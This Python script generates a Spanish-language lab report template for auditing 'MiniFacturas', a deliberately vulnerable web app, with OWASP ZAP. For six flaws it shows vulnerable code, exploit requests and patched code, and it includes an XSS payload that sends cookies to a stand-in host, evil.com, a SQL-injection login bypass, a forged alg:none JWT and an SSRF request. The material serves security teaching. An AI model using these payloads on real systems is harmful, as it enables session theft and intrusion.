#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Genera la plantilla del Informe Final (PDF) del laboratorio de auditoría
con OWASP ZAP, siguiendo la estructura obligatoria de la Sección 8 de la
guía: Portada, Resumen Ejecutivo, Desarrollo por Vulnerabilidad (6),
Anexos.

Los recuadros grises marcados "PEGA AQUÍ TU CAPTURA..." son placeholders:
el estudiante debe reemplazarlos por sus propias capturas de pantalla de
OWASP ZAP antes de entregar. El resto del contenido (código, explicación
técnica, request/response de ejemplo) ya viene redactado a partir del
trabajo real hecho sobre la app MiniFacturas.
"""
from reportlab.lib.pagesizes import LETTER
from reportlab.lib.units import cm
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, HRFlowable, ListFlowable, ListItem, KeepTogether
)
from reportlab.lib.enums import TA_CENTER, TA_LEFT
from reportlab.pdfbase.pdfmetrics import stringWidth

OUT = "Informe_Final_Auditoria_ZAP_MiniFacturas.pdf"

styles = getSampleStyleSheet()
styles.add(ParagraphStyle('TituloPortada', fontName='Helvetica-Bold', fontSize=22,
                           leading=28, alignment=TA_CENTER, spaceAfter=10))
styles.add(ParagraphStyle('SubtituloPortada', fontName='Helvetica', fontSize=13,
                           leading=18, alignment=TA_CENTER, textColor=colors.HexColor('#444444')))
styles.add(ParagraphStyle('H1', fontName='Helvetica-Bold', fontSize=16,
                           leading=20, spaceBefore=18, spaceAfter=8,
                           textColor=colors.HexColor('#1a1a2e')))
styles.add(ParagraphStyle('H2', fontName='Helvetica-Bold', fontSize=12.5,
                           leading=16, spaceBefore=12, spaceAfter=6,
                           textColor=colors.HexColor('#16213e')))
styles.add(ParagraphStyle('H3', fontName='Helvetica-Bold', fontSize=10.5,
                           leading=14, spaceBefore=8, spaceAfter=4,
                           textColor=colors.HexColor('#0f3460')))
styles.add(ParagraphStyle('Cuerpo', fontName='Helvetica', fontSize=9.5,
                           leading=13.5, spaceAfter=6, alignment=TA_LEFT))
styles.add(ParagraphStyle('CuerpoItalic', parent=styles['Cuerpo'], fontName='Helvetica-Oblique',
                           textColor=colors.HexColor('#555555')))
styles.add(ParagraphStyle('CodeBlock', fontName='Courier', fontSize=8, leading=11,
                           backColor=colors.HexColor('#f4f4f4'), borderPadding=6,
                           spaceAfter=6))
styles.add(ParagraphStyle('CodeVuln', parent=styles['CodeBlock'], backColor=colors.HexColor('#fdecea'),
                           textColor=colors.HexColor('#7a1c1c')))
styles.add(ParagraphStyle('CodeFix', parent=styles['CodeBlock'], backColor=colors.HexColor('#e9f7ef'),
                           textColor=colors.HexColor('#145a32')))
styles.add(ParagraphStyle('Placeholder', fontName='Helvetica-Bold', fontSize=9.5,
                           leading=13, alignment=TA_CENTER,
                           textColor=colors.HexColor('#888888')))
styles.add(ParagraphStyle('Riesgo', fontName='Helvetica-Bold', fontSize=9,
                           alignment=TA_CENTER, textColor=colors.white))

def code_block(text, style=styles['CodeBlock']):
    """Escapa XML y preserva saltos de línea / espacios como <br/> y &nbsp;."""
    esc = (text.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;'))
    esc = esc.replace('\n', '<br/>').replace('  ', '&nbsp;&nbsp;')
    return Paragraph(esc, style)

def screenshot_placeholder(label, height=4.2*cm):
    t = Table(
        [[Paragraph(f"[ PEGA AQUÍ TU CAPTURA DE PANTALLA ]<br/>{label}", styles['Placeholder'])]],
        colWidths=[16.5*cm], rowHeights=[height]
    )
    t.setStyle(TableStyle([
        ('BOX', (0, 0), (-1, -1), 1.2, colors.HexColor('#bbbbbb')),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
        ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
        ('BACKGROUND', (0, 0), (-1, -1), colors.HexColor('#fafafa')),
        ('LINEBELOW', (0,0), (-1,-1), 0, colors.white),
    ]))
    return t

def risk_badge(text, color_hex):
    t = Table([[Paragraph(text, styles['Riesgo'])]], colWidths=[3.2*cm], rowHeights=[0.65*cm])
    t.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), colors.HexColor(color_hex)),
        ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
        ('ALIGN', (0,0), (-1,-1), 'CENTER'),
        ('BOX', (0,0), (-1,-1), 0, colors.white),
    ]))
    return t

story = []

# ============================================================
# 1. PORTADA OFICIAL
# ============================================================
story.append(Spacer(1, 3*cm))
story.append(Paragraph("Informe de Auditoría de Seguridad Web", styles['TituloPortada']))
story.append(Paragraph("con OWASP ZAP (Zaproxy)", styles['TituloPortada']))
story.append(Spacer(1, 0.4*cm))
story.append(Paragraph("Diagnóstico DAST, Explotación Controlada y Remediación en Código Fuente",
                        styles['SubtituloPortada']))
story.append(Spacer(1, 1.2*cm))
story.append(HRFlowable(width="60%", thickness=1, color=colors.HexColor('#cccccc'), hAlign='CENTER'))
story.append(Spacer(1, 1.2*cm))

datos_portada = [
    ["Aplicación auditada:", "MiniFacturas (aplicación propia — ver repositorio Git)"],
    ["Tipo de entorno:", "Aplicación Web Propia — Nota máxima 5.0 / 5.0"],
    ["Repositorio Git:", "[PEGA AQUÍ LA URL DE TU REPOSITORIO: https://github.com/tu-usuario/tu-repo]"],
    ["Asignatura:", "Seguridad en Aplicaciones Web / Seguridad Informática"],
    ["Docente:", "Prof. Cristian Lopera Villa"],
    ["Integrante(s):", "[Nombre completo — correo institucional]"],
    ["Fecha de entrega:", "[dd/mm/aaaa]"],
]
tp = Table(datos_portada, colWidths=[4.5*cm, 12*cm])
tp.setStyle(TableStyle([
    ('FONTNAME', (0,0), (0,-1), 'Helvetica-Bold'),
    ('FONTNAME', (1,0), (1,-1), 'Helvetica'),
    ('FONTSIZE', (0,0), (-1,-1), 10),
    ('VALIGN', (0,0), (-1,-1), 'TOP'),
    ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ('LINEBELOW', (0,0), (-1,-2), 0.4, colors.HexColor('#dddddd')),
]))
story.append(tp)
story.append(PageBreak())

# ============================================================
# 2. RESUMEN EJECUTIVO
# ============================================================
story.append(Paragraph("2. Resumen Ejecutivo", styles['H1']))
story.append(Paragraph(
    "Se auditó la aplicación propia <b>MiniFacturas</b> (Node.js, servidor HTTP propio + SQLite), "
    "construida a propósito con 6 vulnerabilidades críticas para efectos de este laboratorio: "
    "JWT Broken Authentication, SSRF, CSRF, SQL Injection, XSS reflejado e IDOR / Mass Assignment. "
    "Se siguió la metodología de 4 fases: diagnóstico manual con ZAP (Manual Explore + HUD + "
    "Breakpoints + Requester), explotación controlada de los 6 vectores, remediación del código "
    "fuente (commit <font face='Courier'>fix: remediación...</font>) y re-escaneo de verificación "
    "confirmando la mitigación.", styles['Cuerpo']))

story.append(Paragraph("Tabla comparativa de alertas (antes vs. después del parche)", styles['H2']))
story.append(Paragraph(
    "Completa esta tabla con el conteo real de alertas que te entregue el reporte generado por "
    "ZAP (Report → Generate Report) en cada fase. Las filas ya están pre-rellenadas con el "
    "resultado esperado de la explotación/verificación manual documentada en este informe.",
    styles['CuerpoItalic']))

styles.add(ParagraphStyle('CellHead', fontName='Helvetica-Bold', fontSize=8.5, leading=11, textColor=colors.white))
styles.add(ParagraphStyle('Cell', fontName='Helvetica', fontSize=8.3, leading=11))

def P(text, style='Cell'):
    return Paragraph(text, styles[style])

tabla_resumen = [
    [P("Vulnerabilidad", 'CellHead'), P("Severidad", 'CellHead'), P("Estado inicial (Fase 2)", 'CellHead'), P("Estado final (Fase 4)", 'CellHead')],
    [P("JWT alg:none (Broken Auth)"), P("Crítica"), P("Explotada — acceso como admin"), P("Mitigada — 401")],
    [P("SSRF"), P("Alta"), P("Explotada — filtra dato interno"), P("Mitigada — 400")],
    [P("CSRF"), P("Media/Alta"), P("Explotada — cambia rol sin consentimiento"), P("Mitigada — 403")],
    [P("SQL Injection"), P("Crítica"), P("Explotada — bypass de login"), P("Mitigada — 401")],
    [P("XSS reflejado"), P("Media/Alta"), P("Explotada — script ejecutable"), P("Mitigada — texto escapado")],
    [P("IDOR"), P("Alta"), P("Explotada — lee factura ajena"), P("Mitigada — 403")],
    [P("Mass Assignment"), P("Alta"), P("Explotada — autoasciende a admin"), P("Mitigada — campo filtrado")],
    [P("Alertas automáticas ZAP (Alta / Media / Baja)"), P("—"),
     P("[PEGA CONTEO: Alta=_ Media=_ Baja=_]"), P("[PEGA CONTEO: Alta=_ Media=_ Baja=_]")],
]
tr = Table(tabla_resumen, colWidths=[4.3*cm, 2.1*cm, 5.1*cm, 5.1*cm], repeatRows=1)
tr.setStyle(TableStyle([
    ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#1a1a2e')),
    ('VALIGN', (0,0), (-1,-1), 'MIDDLE'),
    ('GRID', (0,0), (-1,-1), 0.4, colors.HexColor('#cccccc')),
    ('ROWBACKGROUNDS', (0,1), (-1,-2), [colors.white, colors.HexColor('#f7f7f9')]),
    ('BACKGROUND', (0,-1), (-1,-1), colors.HexColor('#fff8e1')),
    ('TOPPADDING', (0,0), (-1,-1), 5),
    ('BOTTOMPADDING', (0,0), (-1,-1), 5),
    ('LEFTPADDING', (0,0), (-1,-1), 5),
    ('RIGHTPADDING', (0,0), (-1,-1), 5),
]))
story.append(tr)
story.append(PageBreak())

# ============================================================
# 3. DESARROLLO POR VULNERABILIDAD (6 secciones)
# ============================================================

VULN_CODE = {
    'jwt': dict(
        vuln_lang="JavaScript — jwt-vulnerable.js",
        vuln="""// (!) VULNERABLE: confia en el campo "alg" que viene del propio token
function verify(token) {
  ...
  // BUG: alg:none bypassa TODA verificacion de firma
  if (header.alg === 'none') {
    return payload;
  }
  ...
  // BUG: no se valida `exp` (expiracion) ni `iss`
  return payload;
}""",
        fix_lang="JavaScript — jwt-secure.js",
        fix="""// PARCHE: el algoritmo esperado lo decide el SERVIDOR, no el token.
function verify(token) {
  ...
  if (header.alg !== EXPECTED_ALG) {   // EXPECTED_ALG = 'HS256' fijo
    return null;                        // rechaza alg:none y cualquier otro
  }
  const expectedSig = crypto.createHmac('sha256', EFFECTIVE_SECRET)
    .update(`${h}.${p}`).digest();
  if (!crypto.timingSafeEqual(providedSig, expectedSig)) return null;

  // PARCHE: validar expiracion y emisor
  if (payload.exp < now) return null;
  if (payload.iss !== ISSUER) return null;
  return payload;
}""",
    ),
    'ssrf': dict(
        vuln_lang="JavaScript — server.js (POST /api/avatar)",
        vuln="""// (!) VULNERABLE: sin allowlist, sin bloqueo de IPs privadas,
// sin restriccion de esquema
const targetUrl = body.url;
const lib = targetUrl.startsWith('https') ? https : http;
lib.get(targetUrl, (proxyRes) => { ...devuelve la respuesta... });""",
        fix_lang="JavaScript — server.js (POST /api/avatar, parcheado)",
        fix="""// PARCHE: allowlist de hosts + bloqueo de esquemas + bloqueo de IPs
const SSRF_ALLOWED_HOSTS = new Set(['example.com','picsum.photos','httpbin.org']);

async function assertSafeSsrfTarget(targetUrl) {
  const u = new URL(targetUrl);
  if (!['http:','https:'].includes(u.protocol)) throw new Error('Esquema no permitido');
  if (!SSRF_ALLOWED_HOSTS.has(u.hostname)) throw new Error('Host no autorizado');
  const { address } = await dns.lookup(u.hostname);
  if (isPrivateOrReservedIp(address)) throw new Error('IP privada/reservada no permitida');
  return u;
}""",
    ),
    'csrf': dict(
        vuln_lang="JavaScript — server.js (POST /api/profile-form)",
        vuln="""// (!) VULNERABLE: sin token anti-CSRF, sin revisar Origin/Referer
if (req.method === 'POST' && pathname === '/api/profile-form') {
  const user = getAuthUser(req);
  const body = await readFormBody(req);
  // actualiza directo, sin validar que la peticion venga del propio sitio
  db.prepare(`UPDATE users SET ${setClause} WHERE id = ?`).run(...values, user.sub);
}""",
        fix_lang="JavaScript — server.js (parcheado, Synchronizer Token Pattern)",
        fix="""// PARCHE: token anti-CSRF emitido en el login, exigido en cada escritura
function checkCsrfToken(req, userId) {
  const headerToken = req.headers['x-csrf-token'];
  const owner = headerToken && csrfTokens.get(headerToken);
  return owner !== undefined && owner === userId;
}
if (!checkCsrfToken(req, user.sub)) {
  return sendJson(res, 403, { error: 'Token CSRF invalido o ausente' });
}
// + cookie de sesion con HttpOnly y SameSite=Lax""",
    ),
    'sqli': dict(
        vuln_lang="JavaScript — server.js (POST /login)",
        vuln="""// (!) VULNERABLE: concatenacion directa de entrada de usuario en SQL
const sql = `SELECT * FROM users WHERE username = '${username}'
             AND password = '${password}'`;
const rows = db.prepare(sql).all();
// Probar: username = admin' --""",
        fix_lang="JavaScript — server.js (parcheado)",
        fix="""// PARCHE: consulta parametrizada (prepared statement)
const user = db.prepare('SELECT * FROM users WHERE username = ?').get(username);
if (!user || !verifyPassword(password, user.password)) {
  return sendHtml(res, 401, 'Credenciales invalidas');
}
// Bonus: contrasenas hasheadas con scrypt+salt (db.js), no texto plano""",
    ),
    'xss': dict(
        vuln_lang="JavaScript — server.js (GET /search)",
        vuln="""// (!) VULNERABLE: insercion directa de `q` en el HTML, sin encoding
const q = parsed.query.q || '';
const html = `<p>Buscaste: ${q}</p>`;
// Probar: q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>""",
        fix_lang="JavaScript — server.js (parcheado)",
        fix="""// PARCHE: output encoding HTML antes de insertar en la respuesta
function escapeHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;')
    .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}
const html = `<p>Buscaste: ${escapeHtml(q)}</p>`;
// + header Content-Security-Policy: default-src 'self'; script-src 'self'""",
    ),
    'idor': dict(
        vuln_lang="JavaScript — server.js (/api/invoices/:id y /api/profile)",
        vuln="""// (!) VULNERABLE (IDOR): no valida que la factura sea del usuario
const invoice = db.prepare('SELECT * FROM invoices WHERE id = ?').get(id);
return sendJson(res, 200, invoice);

// (!) VULNERABLE (Mass Assignment): vuelca TODOS los campos del body
const fields = Object.keys(body);  // incluye "role" si el atacante lo manda
const setClause = fields.map(f => `${f} = ?`).join(', ');""",
        fix_lang="JavaScript — server.js (parcheado)",
        fix="""// PARCHE (IDOR): control de acceso a nivel de objeto
if (invoice.owner_id !== user.sub && user.role !== 'admin') {
  return sendJson(res, 403, { error: 'No tienes permiso' });
}

// PARCHE (Mass Assignment): DTO allowlisting — "role" NUNCA se acepta
const ALLOWED_PROFILE_FIELDS = ['email'];
const fields = Object.keys(body).filter(f => ALLOWED_PROFILE_FIELDS.includes(f));""",
    ),
}

secciones = [
    dict(key='jwt', num="3.1", titulo="Autenticación Rota en JWT (alg:none)", riesgo="CRÍTICO", color="#b03a2e",
         mecanismo="El endpoint /api/me confía en un JWT decodificado sin exigir un algoritmo de firma "
                    "fijo del lado del servidor. Un atacante forja un token con header "
                    "{\"alg\":\"none\"} y firma vacía, y el servidor lo acepta sin verificar nada.",
         peticion="GET /api/me HTTP/1.1\nHost: localhost:3000\nCookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
                   "eyJzdWIiOjIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
         respuesta="HTTP/1.1 200 OK\nContent-Type: application/json\n\n"
                    "{\"sub\":2,\"username\":\"admin\",\"role\":\"admin\"}",
         respuesta_parcheada="HTTP/1.1 401 Unauthorized\n\n{\"error\":\"No autenticado\"}"),
    dict(key='ssrf', num="3.2", titulo="Server-Side Request Forgery (SSRF)", riesgo="ALTO", color="#ca6f1e",
         mecanismo="POST /api/avatar acepta una URL arbitraria y el servidor la solicita por el usuario, "
                    "sin validar el destino. Esto permite forzar al servidor a consultar servicios internos "
                    "(localhost, metadata de nube) que no deberían ser accesibles desde fuera.",
         peticion="POST /api/avatar HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\n\n"
                   "{\"url\":\"http://localhost:3000/internal/secret\"}",
         respuesta="HTTP/1.1 200 OK\n\n{\"fetchedFrom\":\"http://localhost:3000/internal/secret\","
                    "\"body\":\"{...\\\"internal_api_key\\\":\\\"FLAG{SSRF-interno-expuesto}\\\"}\"}",
         respuesta_parcheada="HTTP/1.1 400 Bad Request\n\n{\"error\":\"Solicitud rechazada\","
                              "\"detail\":\"Host no autorizado: localhost\"}"),
    dict(key='csrf', num="3.3", titulo="Cross-Site Request Forgery (CSRF)", riesgo="MEDIO/ALTO", color="#d4ac0d",
         mecanismo="POST /api/profile-form cambia datos del perfil (incluido el rol) usando solo la cookie "
                    "de sesión como autenticación, sin token anti-CSRF ni validación de origen. Un sitio "
                    "externo (csrf-poc.html) puede disparar la petición automáticamente si la víctima tiene "
                    "sesión activa.",
         peticion="POST /api/profile-form HTTP/1.1\nHost: localhost:3000\n"
                   "Content-Type: application/x-www-form-urlencoded\nCookie: session=<token de la víctima>\n\n"
                   "role=admin",
         respuesta="HTTP/1.1 200 OK\n\n<p>Perfil actualizado.</p>\n(el rol del usuario queda en 'admin' en la BD)",
         respuesta_parcheada="HTTP/1.1 403 Forbidden\n\n{\"error\":\"Token CSRF inválido o ausente\"}"),
    dict(key='sqli', num="3.4", titulo="Inyección SQL (SQLi)", riesgo="CRÍTICO", color="#b03a2e",
         mecanismo="POST /login arma la consulta SQL concatenando directamente username y password. "
                    "Un valor como admin' -- comenta el resto de la condición y permite autenticarse "
                    "como admin sin conocer la contraseña real.",
         peticion="POST /login HTTP/1.1\nHost: localhost:3000\nContent-Type: application/x-www-form-urlencoded\n\n"
                   "username=admin' --&password=cualquiera",
         respuesta="HTTP/1.1 302 Found\nLocation: /perfil\nSet-Cookie: session=<JWT válido como admin>",
         respuesta_parcheada="HTTP/1.1 401 Unauthorized\n\n<p>Credenciales inválidas.</p>"),
    dict(key='xss', num="3.5", titulo="Cross-Site Scripting Reflejado (XSS)", riesgo="MEDIO/ALTO", color="#d4ac0d",
         mecanismo="GET /search inserta el parámetro q directamente en el HTML de respuesta sin ningún "
                    "tipo de codificación de salida, permitiendo ejecutar JavaScript arbitrario en el "
                    "navegador de la víctima.",
         peticion="GET /search?q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script> HTTP/1.1\n"
                   "Host: localhost:3000",
         respuesta="HTTP/1.1 200 OK\n\n<p>Buscaste: <script>fetch('http://evil.com/steal?c='"
                    "+document.cookie)</script></p>\n(el script se ejecuta en el navegador)",
         respuesta_parcheada="HTTP/1.1 200 OK\n\n<p>Buscaste: &lt;script&gt;fetch(...)&lt;/script&gt;</p>\n"
                              "(texto plano, inofensivo)"),
    dict(key='idor', num="3.6", titulo="Control de Acceso Roto (IDOR / Mass Assignment)", riesgo="ALTO", color="#ca6f1e",
         mecanismo="GET /api/invoices/:id no valida que la factura pertenezca al usuario autenticado "
                    "(IDOR). PUT /api/profile y POST /api/profile-form aceptan cualquier campo del body, "
                    "incluido role, y lo escriben directo en la base de datos (Mass Assignment).",
         peticion="GET /api/invoices/4 HTTP/1.1\nHost: localhost:3000\nCookie: session=<token de carlos>\n\n"
                   "--- y ---\nPUT /api/profile HTTP/1.1\nContent-Type: application/json\n"
                   "Cookie: session=<token de carlos>\n\n{\"role\":\"admin\"}",
         respuesta="HTTP/1.1 200 OK\n\n{\"id\":4,\"owner_id\":2,\"concept\":\"Factura confidencial admin\",...}\n"
                    "--- y ---\nHTTP/1.1 200 OK\n\n{\"id\":1,\"username\":\"carlos\",\"role\":\"admin\",...}",
         respuesta_parcheada="HTTP/1.1 403 Forbidden — {\"error\":\"No tienes permiso...\"}\n"
                              "--- y ---\nHTTP/1.1 200 OK — {\"role\":\"user\",...} (campo 'role' ignorado)"),
]

story.append(Paragraph("3. Desarrollo por Vulnerabilidad", styles['H1']))
story.append(Paragraph(
    "Cada subsección sigue el mismo esquema exigido por la guía: diagnóstico en ZAP, evidencia de "
    "explotación, código vulnerable vs. corregido, y verificación post-parche. Las peticiones/"
    "respuestas de ejemplo mostradas abajo fueron reproducidas y confirmadas manualmente con curl y "
    "con el módulo Requester de ZAP sobre la app MiniFacturas (ver GUIA_ZAP.md del repositorio); "
    "reemplaza los recuadros grises por tus propias capturas de pantalla de ZAP.",
    styles['CuerpoItalic']))
story.append(Spacer(1, 6))

for s in secciones:
    block = []
    block.append(Table([[Paragraph(f"{s['num']}  {s['titulo']}", styles['H2']), risk_badge(s['riesgo'], s['color'])]],
                        colWidths=[13.3*cm, 3.2*cm]))
    block[-1].setStyle(TableStyle([('VALIGN', (0,0), (-1,-1), 'MIDDLE'), ('ALIGN', (1,0),(1,0),'RIGHT')]))
    block.append(Paragraph("<b>Mecanismo de la falla:</b> " + s['mecanismo'], styles['Cuerpo']))
    story.extend(block)

    story.append(Paragraph("Diagnóstico en ZAP", styles['H3']))
    story.append(Paragraph("Captura de la alerta emitida por ZAP (Manual Explore / Alerts tab) para esta vulnerabilidad.",
                            styles['CuerpoItalic']))
    story.append(screenshot_placeholder(f"Alerta de ZAP — {s['titulo']}"))

    story.append(Paragraph("Evidencia de explotación (petición / respuesta)", styles['H3']))
    story.append(code_block(s['peticion'], styles['CodeVuln']))
    story.append(code_block(s['respuesta'], styles['CodeVuln']))
    story.append(Paragraph("Complementa con tu captura del módulo Requester/Resend de ZAP mostrando esta misma petición:",
                            styles['CuerpoItalic']))
    story.append(screenshot_placeholder(f"Requester/Resend — explotación de {s['titulo']}", height=3.6*cm))

    story.append(Paragraph("Código vulnerable vs. corregido", styles['H3']))
    vc = VULN_CODE[s['key']]
    tbl = Table([
        [Paragraph(f"<b>VULNERABLE</b> — {vc['vuln_lang']}", styles['Cuerpo']),
         Paragraph(f"<b>CORREGIDO</b> — {vc['fix_lang']}", styles['Cuerpo'])],
        [code_block(vc['vuln'], styles['CodeVuln']), code_block(vc['fix'], styles['CodeFix'])],
    ], colWidths=[8.25*cm, 8.25*cm])
    tbl.setStyle(TableStyle([('VALIGN', (0,0), (-1,-1), 'TOP')]))
    story.append(tbl)

    story.append(Paragraph("Verificación (re-escaneo)", styles['H3']))
    story.append(code_block(s['respuesta_parcheada'], styles['CodeFix']))
    story.append(Paragraph("Captura del re-escaneo en ZAP confirmando que la alerta fue resuelta:",
                            styles['CuerpoItalic']))
    story.append(screenshot_placeholder(f"Re-escaneo / verificación — {s['titulo']}", height=3.6*cm))

    story.append(Spacer(1, 10))
    story.append(HRFlowable(width="100%", thickness=0.6, color=colors.HexColor('#dddddd')))
    story.append(PageBreak())

# ============================================================
# 4. ANEXOS
# ============================================================
story.append(Paragraph("4. Anexos", styles['H1']))
story.append(Paragraph(
    "Adjunta aquí el reporte original exportado por OWASP ZAP (Report → Generate Report) en "
    "formato HTML/PDF, tanto de la Fase 2 (diagnóstico inicial) como de la Fase 4 "
    "(re-escaneo de verificación).", styles['Cuerpo']))
story.append(Spacer(1, 6))
story.append(Paragraph("Anexo A — Reporte ZAP, diagnóstico inicial (Fase 2)", styles['H3']))
story.append(screenshot_placeholder("Exportación completa del reporte ZAP — versión vulnerable", height=5*cm))
story.append(Spacer(1, 10))
story.append(Paragraph("Anexo B — Reporte ZAP, re-escaneo de verificación (Fase 4)", styles['H3']))
story.append(screenshot_placeholder("Exportación completa del reporte ZAP — versión parcheada", height=5*cm))
story.append(Spacer(1, 14))
story.append(Paragraph("Anexo C — Enlace al repositorio Git", styles['H3']))
story.append(Paragraph(
    "[PEGA AQUÍ LA URL DE TU REPOSITORIO]. Debe mostrar al menos dos commits: uno con el código "
    "vulnerable (ej. <font face='Courier'>feat: ... con 6 vulnerabilidades</font>) y otro con el "
    "parche (ej. <font face='Courier'>fix: remediación de las 6 vulnerabilidades</font>).",
    styles['Cuerpo']))

doc = SimpleDocTemplate(OUT, pagesize=LETTER,
                         topMargin=1.8*cm, bottomMargin=1.8*cm,
                         leftMargin=1.8*cm, rightMargin=1.8*cm,
                         title="Informe Final - Auditoría OWASP ZAP - MiniFacturas")
doc.build(story)
print("OK ->", OUT)
